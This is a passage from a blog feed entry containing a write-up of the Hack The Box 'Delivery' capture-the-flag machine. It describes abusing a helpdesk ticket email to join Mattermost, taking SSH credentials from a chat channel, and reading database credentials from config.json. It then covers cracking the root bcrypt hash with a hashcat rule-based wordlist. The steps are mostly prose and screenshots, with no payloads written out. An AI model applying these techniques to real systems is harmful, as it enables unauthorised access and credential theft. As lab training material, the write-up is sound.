&lt;p&gt;We Get Support ticket request created with a ticket id and an email ?
At this point i was hmmmmmmmmmmmm an email , going back to the text we got earlier&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Once you have an @delivery.htb email address, you&amp;#39;ll be able to have access to our MatterMost server
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Now before we go and create an account at mattermost let&amp;rsquo;s check out ticket status.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/delivery/pic7.png&#34; alt=&#34;helpdisk_ticket_cr&#34;&gt;&lt;/p&gt;
&lt;p&gt;We get an confirmation error,that&amp;rsquo;s not great at this point you gotta think out of the box. what email that might exist probably everywhere .
let&amp;rsquo;s submit a new ticket real quick and check again.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/delivery/pic18.png&#34; alt=&#34;helpdisk_ticket_cr2&#34;&gt;&lt;/p&gt;
&lt;p&gt;And We Get Another ticket_id and email address , let&amp;rsquo;s check our ticket status&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/delivery/pic19.png&#34; alt=&#34;helpdisk_ticket_ck&#34;&gt;&lt;/p&gt;
&lt;p&gt;And some how magically We got in as Admin .&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/delivery/pic6.png&#34; alt=&#34;helpdisk_ticke_admin&#34;&gt;&lt;/p&gt;
&lt;p&gt;Now let&amp;rsquo;s go back to the mattermost and create an account with our ticket email&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/delivery/pic3.png&#34; alt=&#34;helpdisk_mattermost&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/delivery/pic4.png&#34; alt=&#34;helpdisk_mattermost2&#34;&gt;&lt;/p&gt;
&lt;p&gt;Also we get email verification , at this point you should really use your mind for a bit . we go back to our check ticket status and we get a reply&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/delivery/pic1.png&#34; alt=&#34;helpdisk_mattermost1&#34;&gt;&lt;/p&gt;
&lt;p&gt;It&amp;rsquo;s the verification code, sweet now we can verify our email address and simply login.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/delivery/pic16.png&#34; alt=&#34;helpdisk_mattermost_login&#34;&gt;&lt;/p&gt;
&lt;p&gt;Now Let&amp;rsquo;s explore a bit, we click on internal and get into the channel we see there&amp;rsquo;s messages left by admin over there .&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/delivery/pic2.png&#34; alt=&#34;helpdisk_mattermost_msg&#34;&gt;&lt;/p&gt;
&lt;p&gt;We see credentials , Swwwwwweet .let&amp;rsquo;s login via ssh .&lt;/p&gt;
&lt;p&gt;PS: I covered the credentials so you do the box instead of copying and pasting&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/delivery/pic27.png&#34; alt=&#34;helpdisk_mattermost_ssh&#34;&gt;&lt;/p&gt;
&lt;p&gt;And There we go , now we can read the user.txt&lt;/p&gt;
&lt;h2 id=&#34;privilege-escalation&#34; &gt;Privilege Escalation
&lt;span&gt;
    &lt;a href=&#34;#privilege-escalation&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;&lt;p&gt;At This point it&amp;rsquo;s pretty straight forward , let&amp;rsquo;s run linpeas.sh and see what&amp;rsquo;s going on but there&amp;rsquo;s nothing.
let&amp;rsquo;s check &lt;code&gt;/opt&lt;/code&gt; we can see mattermost installation let&amp;rsquo;s check it .&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/delivery/pic12.png&#34; alt=&#34;helpdisk_logged_in1&#34;&gt;&lt;/p&gt;
&lt;p&gt;the first thing i do , is to check the configs since they usually store credentials , and sensitive information .&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/delivery/pic15.png&#34; alt=&#34;helpdisk_logged_in1&#34;&gt;&lt;/p&gt;
&lt;p&gt;Oh the config.json is interesting , let&amp;rsquo;s check it out&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/delivery/pic5.png&#34; alt=&#34;helpdisk_logged_config&#34;&gt;&lt;/p&gt;
&lt;p&gt;We can see there&amp;rsquo;s an mysql settings with some credentails , running ss -lnpt we see mysql is running .
Let&amp;rsquo;s Logging And Check The database.
PS: The password is a hint itself it says crack the mattermost password which is the root password&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/delivery/pic11.png&#34; alt=&#34;helpdisk_logged_mysql&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/delivery/pic20.png&#34; alt=&#34;helpdisk_logged_mysql2&#34;&gt;&lt;/p&gt;
&lt;p&gt;Ah there&amp;rsquo;s too many tables there , but we just interested in the Users tables.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/delivery/pic17.png&#34; alt=&#34;helpdisk_logged_mysql&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/delivery/pic28.png&#34; alt=&#34;helpdisk_logged_mysql1&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/delivery/pic14.png&#34; alt=&#34;helpdisk_logged_mysql2&#34;&gt;&lt;/p&gt;
&lt;p&gt;We have the root hash it&amp;rsquo;s a bcrypt type. now before we crack it, remember from the mattermost internal channel the admin user gave us a valuable hint .&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;PleaseSubscribe! may not be in RockYou but if any hacker manages to get our hashes, they can use hashcat rules to easily crack all variations of common words or phrases.
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This is a usefull hint to let us know that we should generate a wordlist from hashcat rules in order to crack the root hash through &amp;ldquo;PleaseSubscribe!&amp;rdquo;
Let&amp;rsquo;s go to our crackred and generate a wordlist .&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/delivery/pic21.png&#34; alt=&#34;helpdisk_crackred&#34;&gt;&lt;/p&gt;
&lt;p&gt;that&amp;rsquo;s not a big wordlist , it should crack really fast. let&amp;rsquo;s crack our hash.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/delivery/pic13.png&#34; alt=&#34;helpdisk_crackred1&#34;&gt;&lt;/p&gt;
&lt;p&gt;And there we goo , we&amp;rsquo;ve cracked it,took about 2 seconds , now let&amp;rsquo;s su to root.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/delivery/pic23.png&#34; alt=&#34;helpdisk_root&#34;&gt;&lt;/p&gt;
&lt;p&gt;And That&amp;rsquo;s it , that&amp;rsquo;s delivery hope you enjoyed the writeup take care and i&amp;rsquo;ll see you all other time.&lt;/p&gt;</description>
    </item>
    
  </channel>
</rss>
